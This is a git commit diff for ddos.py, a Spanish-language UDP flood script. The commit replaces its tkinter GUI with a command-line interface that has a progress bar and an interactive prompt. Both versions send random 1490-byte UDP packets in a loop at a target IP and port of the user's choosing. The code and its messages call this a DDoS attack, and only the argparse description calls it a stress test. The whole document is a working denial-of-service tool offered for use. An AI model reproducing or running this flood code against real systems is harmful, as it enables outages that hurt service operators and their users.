ef14a2f6f1b7af9b3fd5ac02f99451e1e3539ba0
kriztpow <45737457+kriztpow@users.noreply.github.com>
2023-10-05 23:52:11 -0500

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,63 +1,49 @@
-import tkinter as tk
 import socket
 import random
-import threading
+import argparse
+import time
 from datetime import datetime
+from tqdm import tqdm
 
 # Función para iniciar el ataque DDoS
-def iniciar_ataque():
-    ip_target = ip_entry.get()
-    try:
-        port = int(port_entry.get())
-        total_paquetes = int(packets_entry.get())
-    except ValueError:
-        result_label.config(text="Ingresa valores válidos")
-        return
+def iniciar_ataque(ip_target, port, total_paquetes):
+    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_bytes = random._urandom(1490)
 
-    result_label.config(text="Ataque en progreso...")
-    attack_button.config(state=tk.DISABLED)
+    print("\nIniciando ataque DDoS...")
+    print(f"Objetivo: {ip_target}:{port}")
+    print(f"Cantidad de paquetes a enviar: {total_paquetes}\n")
 
-    def realizar_ataque():
-        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        udp_bytes = random._urandom(1490)
+    with tqdm(total=total_paquetes, unit="paquetes") as progress_bar:
+        try:
+            for i in range(total_paquetes):
+                udp_socket.sendto(udp_bytes, (ip_target, port))
+                progress_bar.update(1)
+                time.sleep(0.01)  # Pequeña pausa para la visualización
 
-        for i in range(total_paquetes):
-            udp_socket.sendto(udp_bytes, (ip_target, port))
-            progress = (i + 1) / total_paquetes * 100
-            progress_label.config(text=f"Progreso: {int(progress)}%")
+            udp_socket.close()
+            print("\nAtaque DDoS completado.")
+        except KeyboardInterrupt:
+            print("\nAtaque DDoS detenido por el usuario.")
+        except Exception as e:
+            print(f"Se produjo un error: {e}")
 
-        udp_socket.close()
-        result_label.config(text="Ataque completado.")
-        attack_button.config(state=tk.NORMAL)
+def main():
+    parser = argparse.ArgumentParser(description="Herramienta de Prueba de Estrés DDoS")
+    parser.add_argument("ip", type=str, help="IP del objetivo")
+    parser.add_argument("port", type=int, help="Puerto de destino")
+    parser.add_argument("packets", type=int, help="Cantidad de paquetes a enviar")
+    parser.add_argument("--interactive", action="store_true", help="Modo interactivo")
 
-    threading.Thread(target=realizar_ataque).start()
+    args = parser.parse_args()
 
-# Configuración de la ventana GUI
-window = tk.Tk()
-window.title("Herramienta de Prueba de Estrés")
+    if args.interactive:
+        print("Modo interactivo activado. Siga las instrucciones:")
+        args.ip = input("Ingrese la IP del objetivo: ")
+        args.port = int(input("Ingrese el puerto: "))
+        args.packets = int(input("Ingrese la cantidad de paquetes: "))
 
-ip_label = tk.Label(window, text="IP del objetivo:")
-ip_label.pack()
-ip_entry = tk.Entry(window)
-ip_entry.pack()
+    iniciar_ataque(args.ip, args.port, args.packets)
 
-port_label = tk.Label(window, text="Puerto:")
-port_label.pack()
-port_entry = tk.Entry(window)
-port_entry.pack()
-
-packets_label = tk.Label(window, text="Cantidad de paquetes:")
-packets_label.pack()
-packets_entry = tk.Entry(window)
-packets_entry.pack()
-
-attack_button = tk.Button(window, text="Iniciar Ataque", command=iniciar_ataque)
-attack_button.pack()
-
-progress_label = tk.Label(window, text="Progreso: 0%")
-progress_label.pack()
-
-result_label = tk.Label(window, text="")
-result_label.pack()
-
-window.mainloop()
+if __name__ == '__main__':
+    main()
